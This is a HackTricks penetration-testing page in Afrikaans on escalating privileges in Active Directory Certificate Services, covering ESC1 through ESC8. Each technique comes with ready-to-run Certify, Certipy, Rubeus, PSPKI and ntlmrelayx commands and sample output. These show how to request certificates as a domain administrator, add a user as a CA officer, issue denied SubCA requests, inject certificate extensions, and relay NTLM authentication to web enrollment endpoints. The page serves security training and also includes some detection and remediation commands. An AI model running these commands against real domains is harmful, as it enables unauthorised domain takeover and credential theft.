# AD CS Domein Eskalasie

{{#include ../../../banners/hacktricks-training.md}}


**Dit is 'n samevatting van die eskalasie-tegniekafdelings van die artikels:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Verkeerd gekonfigureerde sertifikaat-sjablone - ESC1

### Verduideliking

### Verduideliking van Verkeerd Gekonfigureerde Sertifikaat-sjablone - ESC1

- **Aanmeldingsregte word deur die Enterprise CA aan lae-privilegie-gebruikers toegekend.**
- **Bestuurdersgoedkeuring is nie vereis nie.**
- **Geen handtekeninge van gemagtigde personeel is nodig nie.**
- **Sekuriteitsbeskrywers op sertifikaat-sjablone is te ruim, wat lae-privilegie-gebruikers toelaat om aanmeldingsregte te bekom.**
- **Sertifikaat-sjablone is gekonfigureer om EKU's te definieer wat verifikasie vergemaklik:**
- Extended Key Usage (EKU) identifiers soos Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), of geen EKU (SubCA) is ingesluit.
- **Die vermoë vir aansoekers om 'n subjectAltName in die Certificate Signing Request (CSR) in te sluit, word deur die sjabloon toegelaat:**
- Active Directory (AD) prioritiseer die subjectAltName (SAN) in 'n sertifikaat vir identiteitsverifikasie indien dit teenwoordig is. Dit beteken dat deur die SAN in 'n CSR te spesifiseer, 'n sertifikaat aangevra kan word om enige gebruiker te laak (bv. 'n domain administrator) te impersonate. Of 'n SAN deur die aansoeker gespesifiseer kan word, word aangedui in die sertifikaat-sjabloon se AD-voorwerp deur die `mspki-certificate-name-flag` eienskap. Hierdie eienskap is 'n bitmasker, en die teenwoordigheid van die `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` vlag maak dit moontlik dat die aansoeker die SAN kan spesifiseer.

> [!CAUTION]
> Die konfigurering soos uiteengesit maak dit moontlik vir lae-privilegie-gebruikers om sertifikate met enige gekose SAN aan te vra, wat verifikasie as enige domein-prinsipaal deur Kerberos of SChannel moontlik maak.

Hierdie funksie word soms geaktiveer om die on-the-fly generering van HTTPS- of host-sertifikate deur produkte of ontplooiingsdienste te ondersteun, of weens 'n gebrek aan begrip.

Daar word opgemerk dat die skep van 'n sertifikaat met hierdie opsie 'n waarskuwing veroorsaak, wat nie die geval is wanneer 'n bestaande sertifikaat-sjabloon (soos die `WebServer` sjabloon, wat die `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` geaktiveer het) gedupliseer en dan gewysig word om 'n authentication OID in te sluit nie.

### Misbruik

Om **kwesbare sertifikaat-sjablone te vind** kan jy hardloop:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Om **hierdie kwesbaarheid te misbruik om 'n administrateur na te boots** kan 'n mens die volgende uitvoer:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Dan kan jy die gegenereerde **sertifikaat na `.pfx`** formaat omskep en dit weer gebruik om te **authenticate using Rubeus or certipy**:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Die Windows-binaries "Certreq.exe" & "Certutil.exe" kan gebruik word om die PFX te genereer: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Die enumerasie van sertifikaat-sjablone binne die AD Forest se konfigurasieskema, veral dié wat nie goedkeuring of ondertekeninge vereis nie, wat 'n Client Authentication of Smart Card Logon EKU het, en met die `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` vlag geaktiveer, kan uitgevoer word deur die volgende LDAP-query uit te voer:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Verkeerd geconfigureerde sertifikaatsjablone - ESC2

### Verklaring

Die tweede misbruikscenario is 'n variasie van die eerste:

1. Registreringsregte word deur die Enterprise CA aan lae-bevoegde gebruikers toegewys.
2. Die vereiste vir bestuurdergoedkeuring is gedeaktiveer.
3. Die behoefte aan gemagtigde handtekeninge word weggelaat.
4. 'n Te toegeeflike security descriptor op die sertifikaatsjabloon verleen die regte om sertifikate te registreer aan lae-bevoegde gebruikers.
5. **Die sertifikaatsjabloon is gedefinieer om die Any Purpose EKU in te sluit of geen EKU nie.**

Die Any Purpose EKU stel 'n aanvaller in staat om 'n sertifikaat vir enige doel te bekom, insluitend kliëntverifikasie, bedienerverifikasie, kodeondertekening, ens. Dieselfde tegniek wat vir ESC3 gebruik is, kan aangewend word om hierdie scenario te misbruik.

Sertifikate sonder EKUs, wat as subordinate CA-sertifikate optree, kan vir enige doel uitgebuit word en kan ook gebruik word om nuwe sertifikate te onderteken. Daarom kan 'n aanvaller ewekansige EKUs of velde in die nuwe sertifikate spesifiseer deur 'n subordinate CA-sertifikaat te gebruik.

Nuwe sertifikate wat geskep is vir domeinverifikasie sal egter nie funksioneer nie indien die subordinate CA nie deur die `NTAuthCertificates`-object vertrou word nie, wat die verstekinstelling is. Nietemin kan 'n aanvaller steeds nuwe sertifikate skep met enige EKU en ewekansige sertifikaatwaardes. Hierdie kan potensieel misbruik word vir 'n wye reeks doeleindes (bv. kodeondertekening, bedienerverifikasie, ens.) en kan beduidende implikasies hê vir ander toepassings in die netwerk soos SAML, AD FS of IPSec.

Om sjablone wat by hierdie scenario pas binne die AD Forest se konfigurasieskema te lys, kan die volgende LDAP query uitgevoer word:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Verkeerd gekonfigureerde Enrolment Agent-sjablone - ESC3

### Verduideliking

Hierdie scenario is soos die eerste en tweede, maar **misbruik** 'n **ander EKU** (Certificate Request Agent) en **2 verskillende sjablone** (daarom het dit 2 stelle vereistes),

Die **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), bekend as **Enrollment Agent** in Microsoft-dokumentasie, laat 'n prinsipaal toe om vir 'n **sertifikaat** te **registreer** namens 'n ander gebruiker.

Die **“enrollment agent”** skryf in op so 'n **sjabloon** en gebruik die resulterende **sertifikaat om 'n CSR namens die ander gebruiker saam te onderteken**. Dit **stuur** dan die **gesamentlik-ondertekende CSR** na die CA, skryf in op 'n **sjabloon** wat **“enroll on behalf of”** toelaat, en die CA reageer met 'n **sertifikaat wat aan die “ander” gebruiker behoort**.

**Requirements 1:**

- Inskrywingsregte word deur die Enterprise CA aan gebruikers met lae bevoegdhede gegee.
- Die vereiste vir bestuurdergoedkeuring is weggelaat.
- Geen vereiste vir gemagtigde handtekeninge nie.
- Die sekuriteitsdescriptor van die sertifikaatsjabloon is te permissief en verleen inskrywingsregte aan gebruikers met lae bevoegdhede.
- Die sertifikaatsjabloon sluit die Certificate Request Agent EKU in, wat die aanvraag van ander sertifikaatsjablone namens ander prinsipale moontlik maak.

**Requirements 2:**

- Die Enterprise CA verleen inskrywingsregte aan gebruikers met lae bevoegdhede.
- Bestuurdergoedkeuring word omseil.
- Die sjabloon se skemaweergawe is óf 1 óf hoër as 2, en dit spesifiseer 'n Application Policy Issuance Requirement wat die Certificate Request Agent EKU vereis.
- 'n EKU wat in die sertifikaatsjabloon gedefinieer is, laat domeinverifikasie toe.
- Beperkings vir enrollment agents word nie op die CA toegepas nie.

### Misbruik

Jy kan [**Certify**](https://github.com/GhostPack/Certify) of [**Certipy**](https://github.com/ly4k/Certipy) gebruik om hierdie scenario te misbruik:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Die **gebruikers** wat toegelaat word om 'n **enrollment agent certificate** te **verkry**, die templates waarin inskrywings**agents** toegelaat word om in te skryf, en die **rekeninge** namens wie die enrollment agent kan optree, kan deur enterprise CAs beperk word. Dit word gedoen deur die `certsrc.msc` **snap-in** oop te maak, **regsklik op die CA**, **klik Properties**, en dan **navigeer** na die “Enrollment Agents” tab.

Dit is egter opgemerk dat die **default** instelling vir CAs “**Do not restrict enrollment agents**.” is. Wanneer die beperking op enrollment agents deur administrateurs aangeskakel word deur dit op “Restrict enrollment agents” te stel, bly die standaardkonfigurasie uiters permissief. Dit gee **Everyone** toegang om in alle templates as enigiemand in te skryf.

## Kwesbare Sertifikaat Sjabloon Toegangsbeheer - ESC4

### **Verduideliking**

Die **security descriptor** op **certificate templates** bepaal die **permissions** wat spesifieke **AD principals** rakende die sjabloon het.

Indien 'n **attacker** die nodige **permissions** het om 'n **template** te **wysig** en enige **uitbuitbare wankonfigurasies** wat in **vorige afdelings** uiteengesit is te **instel**, kan privilege escalation gefasiliteer word.

Noemenswaardige permissions wat op certificate templates van toepassing is sluit in:

- **Owner:** Gee implisiete beheer oor die objek, en laat die wysiging van enige eienskappe toe.
- **FullControl:** Bied volle gesag oor die objek, insluitend die vermoë om enige eienskappe te wysig.
- **WriteOwner:** Laat toe dat die eienaar van die objek na 'n principal onder die beheer van die attacker verander word.
- **WriteDacl:** Laat toe dat toegangskontroles aangepas word, wat moontlik 'n attacker FullControl kan gee.
- **WriteProperty:** Gemagtig die wysiging van enige objekeienskappe.

### Misbruik

Om principals met wysigingsregte op templates en ander PKI-objekte te identifiseer, enumereer met Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
'n voorbeeld van 'n privesc soos die vorige:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 is wanneer 'n gebruiker skryfbevoegdhede oor 'n sertifikaatsjabloon het. Dit kan byvoorbeeld misbruik word om die konfigurasie van die sertifikaatsjabloon oor te skryf en die sjabloon kwesbaar te maak vir ESC1.

Soos ons in die pad hierbo kan sien, het slegs `JOHNPC` hierdie bevoegdhede, maar ons gebruiker `JOHN` het die nuwe `AddKeyCredentialLink` edge na `JOHNPC`. Aangesien hierdie tegniek met sertifikate verband hou, het ek hierdie aanval ook geïmplementeer, wat bekend staan as [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Hier is 'n klein voorsmakie van Certipy’s `shadow auto` kommando om die NT-hash van die slagoffer te onttrek.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** kan die konfigurasie van 'n sertifikaat-sjabloon met 'n enkele opdrag oorskryf. By **default**, sal Certipy die konfigurasie **overwrite** om dit **vulnerable to ESC1** te maak. Ons kan ook die **`-save-old` parameter om die ou konfigurasie te stoor** spesifiseer, wat nuttig sal wees vir die **herstel** van die konfigurasie na ons aanval.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Kwesbare PKI-objek Toegangsbeheer - ESC5

### Verduideliking

Die uitgebreide netwerk van onderling gekoppelde ACL-gebaseerde verhoudings, wat verskeie voorwerpe insluit buite sertifikaatsjablone en die certificate authority, kan die sekuriteit van die hele AD CS-stelsel beïnvloed. Hierdie voorwerpe, wat die sekuriteit aansienlik kan beïnvloed, sluit in:

- Die AD-rekenaarvoorwerp van die CA-bediener, wat moontlik gekompromitteer kan word deur meganismes soos S4U2Self of S4U2Proxy.
- Die RPC/DCOM-bediener van die CA-bediener.
- Enige afstammeling AD-voorwerp of container binne die spesifieke containerpad `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Hierdie pad sluit in, maar is nie beperk tot, containers en voorwerpe soos die Certificate Templates container, Certification Authorities container, die NTAuthCertificates object, en die Enrollment Services Container.

Die sekuriteit van die PKI-stelsel kan gekompromitteer word as 'n aanvaller met lae voorregte beheer oor enige van hierdie kritieke komponente kry.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Verduideliking

Die onderwerp wat in die [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) bespreek word, raak ook aan die implikasies van die **`EDITF_ATTRIBUTESUBJECTALTNAME2`** vlag, soos uiteengesit deur Microsoft. Hierdie konfiguratie, wanneer dit op 'n Certification Authority (CA) geaktiveer is, laat die insluiting van **gebruikergeïndefinieerde waardes** in die **subject alternative name** toe vir **enige versoek**, insluitend dié wat uit Active Directory® opgebou is. Gevolglik maak hierdie bepaling dit vir 'n **indringer** moontlik om deur **enige template** wat op domein **authentisering** ingestel is in te skryf—spesifiek dié wat oop is vir **gebruikers sonder voorregte** registrasie, soos die standaard User template. Dit kan lei tot die uitreik van 'n sertifikaat wat die indringer in staat stel om as 'n domeinadministrateur of **enige ander aktiewe entiteit** binne die domein te authentiseer.

**Nota**: Die benadering om **alternatiewe name** by 'n Certificate Signing Request (CSR) te voeg deur die `-attrib "SAN:"` argument in `certreq.exe` (verwys as “Name Value Pairs”), staan in **kontras** met die uitbuitingstrategie van SANs in ESC1. Hier lê die onderskeid in **hoe rekeninginligting gekapsel is**—binne 'n certificate attribute, eerder as 'n uitbreiding.

### Misbruik

Om te verifieer of die instelling geaktiveer is, kan organisasies die volgende opdrag met `certutil.exe` gebruik:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Hierdie operasie maak in wese gebruik van **remote registry access**, daarom kan 'n alternatiewe benadering wees:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Gereedskap soos [**Certify**](https://github.com/GhostPack/Certify) en [**Certipy**](https://github.com/ly4k/Certipy) kan hierdie wankonfigurasie opspoor en uitbuit:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Om hierdie instellings te verander, mits iemand oor **domain administrative** rights of 'n gelykwaardige reg beskik, kan die volgende opdrag vanaf enige werkstasie uitgevoer word:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Om hierdie konfigurasie in jou omgewing uit te skakel, kan die flag verwyder word met:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Na die veiligheidsopdaterings van Mei 2022 sal nuut uitgereikte **certificates** 'n **security extension** bevat wat die **requester's `objectSid` property`** inkorporeer. Vir ESC1 word hierdie SID afgelei van die gespesifiseerde SAN. Vir **ESC6** weerspieël die SID egter die **requester's `objectSid`**, nie die SAN nie.\
> Om ESC6 te misbruik, is dit noodsaaklik dat die stelsel vatbaar is vir ESC10 (Weak Certificate Mappings), wat die **SAN bo die nuwe security extension** prioritiseer.

## Kwetsbare Certificate Authority Toegangsbeheer - ESC7

### Aanval 1

#### Verduideliking

Toegangsbeheer vir 'n certificate authority word gehandhaaf deur 'n stel permissies wat CA-aksies reguleer. Hierdie permissies kan besigtig word deur `certsrv.msc` te open, met die rechtermuisknop op 'n CA te klik, properties te kies, en dan na die Security tab te navigeer. Daarbenewens kan permissies geënumeer word met die PSPKI module met opdragte soos:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
This provides insights into the primary rights, namely **`ManageCA`** and **`ManageCertificates`**, correlating to the roles of “CA administrator” and “Certificate Manager” respectively.

#### Misbruik

Om **`ManageCA`** regte op 'n certificate authority te hê, stel die principal in staat om instellings op afstand te manipuleer met PSPKI. Dit sluit in die omskakeling van die **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag om SAN-spesifikasie in enige sjabloon toe te laat, 'n kritieke aspek van domain escalation.

Hierdie proses kan vereenvoudig word deur die gebruik van PSPKI se **Enable-PolicyModuleFlag** cmdlet, wat wysigings sonder direkte GUI-interaksie toelaat.

Besit van **`ManageCertificates`** regte vergemaklik die goedkeuring van hangende versoeke, wat effektief die "CA certificate manager approval" beskerming omseil.

'n Kombinasie van **Certify** en **PSPKI** modules kan gebruik word om 'n sertifikaat aan te vra, goed te keur en af te laai:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Aanval 2

#### Verduideliking

> [!WARNING]
> In die **vorige aanval** is **`Manage CA`** permissies gebruik om die **EDITF_ATTRIBUTESUBJECTALTNAME2** vlag te **aktiveer** om die **ESC6 attack** uit te voer, maar dit sal geen effek hê totdat die CA-diens (`CertSvc`) herbegin is nie. Wanneer 'n gebruiker die `Manage CA` toegangreg het, mag die gebruiker ook die **diens herbegin**. Dit beteken egter **nie dat die gebruiker die diens op afstand kan herbegin nie**. Verder mag **ESC6 nie out-of-the-box werk nie** in die meeste gepatchte omgewings weens die Mei 2022 sekuriteitsopdaterings.

Daarom word hier 'n ander aanval voorgestel.

Vereistes:

- Slegs **`ManageCA` permission**
- **`Manage Certificates`** permission (kan toegeken word vanaf **`ManageCA`**)
- Sertifikaat-sjabloon **`SubCA`** moet **geaktiveer** wees (kan vanaf **`ManageCA`** geaktiveer word)

Die tegniek berus op die feit dat gebruikers met die `Manage CA` _en_ `Manage Certificates` toegangreg kan **uitreik van mislukte sertifikaatversoeke**. Die **`SubCA`** sertifikaat-sjabloon is **vulnerable to ESC1**, maar **slegs administrators** kan in die sjabloon inskryf. Dus kan 'n **gebruiker** versoek om in die **`SubCA`** in te skryf — wat **geweier** sal word — maar later deur die bestuurder **uitgereik** word.

#### Misbruik

Jy kan jouself die **`Manage Certificates`** toegangreg toeken deur jou gebruiker as 'n nuwe beampte by te voeg.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Die **`SubCA`** sjabloon kan **op die CA geaktiveer** word met die `-enable-template` parameter. Per verstek is die `SubCA` sjabloon geaktiveer.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
As ons die voorafvereistes vir hierdie aanval vervul het, kan ons begin deur **'n sertifikaat aan te vra gebaseer op die `SubCA`-sjabloon**.

**Hierdie versoek sal geweie**r, maar ons sal die private sleutel stoor en die versoek-ID neerskryf.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Met ons **`Manage CA` and `Manage Certificates`**, kan ons dan die **mislukte sertifikaatversoek uitreik** met die `ca` opdrag en die `-issue-request <request ID>` parameter.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
En uiteindelik kan ons **die uitgereikte sertifikaat ophaal** met die `req` command en die `-retrieve <request ID>` parameter.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Aanval 3 – Manage Certificates Extension Abuse (SetExtension)

#### Verduideliking

Benewens die klassieke ESC7-misbruik (om EDITF-attribuut te aktiveer of hangende versoeke goed te keur), het **Certify 2.0** 'n heeltemal nuwe primitief ontsluit wat slegs die *Manage Certificates* (ook bekend as **Certificate Manager / Officer**) rol op die Enterprise CA vereis.

Die `ICertAdmin::SetExtension` RPC-metode kan deur enige prinsipaal met *Manage Certificates* uitgevoer word. Terwyl die metode tradisioneel deur legitieme CA's gebruik is om uitbreidings op **hangende** versoeke by te werk, kan 'n aanvaller dit misbruik om 'n **nie-standaard** sertifikaatuitbreiding by te voeg (byvoorbeeld 'n pasgemaakte *Certificate Issuance Policy* OID soos `1.1.1.1`) by 'n versoek wat wag op goedkeuring.

Omdat die geteikende sjabloon **geen standaardwaarde vir daardie uitbreiding definieer nie**, sal die CA NIE die aanvaller-beheerde waarde oorskryf wanneer die versoek uiteindelik uitgegee word nie. Die resulterende sertifikaat bevat dus 'n uitbreiding gekies deur die aanvaller wat mag:

* Tevredestel Application / Issuance Policy-vereistes van ander kwesbare sjablone (wat tot privilege escalation kan lei).
* Inspuit ekstra EKU's of beleide wat die sertifikaat onverwagte vertroue in derdeparty-stelsels gee.

In kort, *Manage Certificates* – voorheen beskou as die "minder kragtige" helfte van ESC7 – kan nou aangewend word vir volle privilege escalation of langtermynpersistensie, sonder om CA-konfigurasie aan te raak of die meer beperkende *Manage CA* reg te vereis.

#### Misbruik van die primitief met Certify 2.0

1. **Dien 'n sertifikaatversoek in wat *hangend* sal bly.**  Dit kan geforseer word met 'n sjabloon wat bestuurdergoedkeuring vereis:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Voeg 'n pasgemaakte uitbreiding by die hangende versoek** met die nuwe `manage-ca` opdrag:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*As die sjabloon nie reeds die *Certificate Issuance Policies* uitbreiding definieer nie, sal die waarde hierbo na uitreiking behou bly.*

3. **Gee die versoek uit** (as jou rol ook *Manage Certificates* goedkeuringsregte het) of wag vir 'n operateur om dit goed te keur. Sodra dit uitgegee is, laai die sertifikaat af:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Die resulterende sertifikaat bevat nou die kwaadwillige issuance-policy OID en kan in daaropvolgende aanvalle gebruik word (bv. ESC13, domain escalation, ens.).

> NOTA: Dieselfde aanval kan uitgevoer word met Certipy ≥ 4.7 deur die `ca` opdrag en die `-set-extension` parameter.

## NTLM Relay na AD CS HTTP-eindpunte – ESC8

### Verduideliking

> [!TIP]
> In omgewings waar **AD CS geïnstalleer** is, en daar 'n **kwesbare web enrollment endpoint** bestaan en ten minste een **sertifikaatsjabloon gepubliseer** is wat **domeinrekenaar-registrasie en kliëntverifikasie** toelaat (soos die standaard **`Machine`** sjabloon), word dit moontlik dat **enige rekenaar met die spooler-diens aktief deur 'n aanvaller gekompromitteer kan word**!

Verskeie **HTTP-gebaseerde registrasiemetodes** word deur AD CS ondersteun, beskikbaar gemaak deur addisionele bedienerrolle wat administrateurs kan installeer. Hierdie koppelvlakke vir HTTP-gebaseerde sertifikaatregistrasie is vatbaar vir **NTLM relay-aanvalle**. 'n Aanvaller, vanaf 'n **gekompromitteerde masjien, kan enige AD-rekening imiteer wat via inkomende NTLM verifieer**. Terwyl hy die slagofferreken ingee, kan die aanvaller hierdie webkoppelvlakke gebruik om **'n kliëntverifikasie-sertifikaat aan te vra met die `User` of `Machine` sertifikaatsjablone**.

- Die **web enrollment interface** (’n ouer ASP-toepassing beskikbaar by `http://<caserver>/certsrv/`) staan standaard slegs HTTP toe, wat geen beskerming teen NTLM relay-aanvalle bied nie. Boonop laat dit uitdruklik slegs NTLM-verifikasie toe deur sy Authorization HTTP-header, waardeur meer veilige verifikasiemetodes soos Kerberos nie van toepassing is nie.
- Die **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service, en **Network Device Enrollment Service** (NDES) ondersteun standaard negotiate-verifikasie via hul Authorization HTTP-header. Negotiate-verifikasie **ondersteun beide** Kerberos en **NTLM**, wat 'n aanvaller in staat stel om tydens relay-aanvalle na NTLM af te gradeer. Alhoewel hierdie webdienste HTTPS standaard aktiveer, beskerm HTTPS op sigself **nie teen NTLM relay-aanvalle nie**. Beskerming teen NTLM relay-aanvalle vir HTTPS-dienste is slegs moontlik wanneer HTTPS met channel binding gekombineer word. Ongelukkig aktiveer AD CS nie Extended Protection for Authentication op IIS nie, wat benodig word vir channel binding.

'n Algemene **probleem** met NTLM relay-aanvalle is die **korte duur van NTLM-sessies** en die onvermoë van die aanvaller om met dienste te kommunikeer wat **NTLM-ondertekening vereis**.

Nietemin word hierdie beperking oorkom deur 'n NTLM relay-aanval te gebruik om 'n sertifikaat vir die gebruiker te bekom, aangesien die sertifikaat se geldigheidsperiode die sessieduur bepaal, en die sertifikaat saam met dienste gebruik kan word wat **NTLM-ondertekening vereis**. Vir instruksies oor die gebruik van 'n gesteelde sertifikaat, verwys na:


{{#ref}}
account-persistence.md
{{#endref}}

'n Ander beperking van NTLM relay-aanvalle is dat **'n aanvaller-beheerde masjien deur 'n slagofferrekening geverifieer moet word**. Die aanvaller kan óf wag óf probeer om hierdie verifikasie te **afdwing**:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Misbruik**

[**Certify**](https://github.com/GhostPack/Certify) se `cas` som die ingeskakelde **HTTP AD CS-eindpunte** op:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Die `msPKI-Enrollment-Servers` eienskap word deur ondernemings se Certificate Authorities (CAs) gebruik om Certificate Enrollment Service (CES) eindpunte te stoor. Hierdie eindpunte kan met die hulpmiddel **Certutil.exe** ontleed en gelys word:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Misbruik met Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
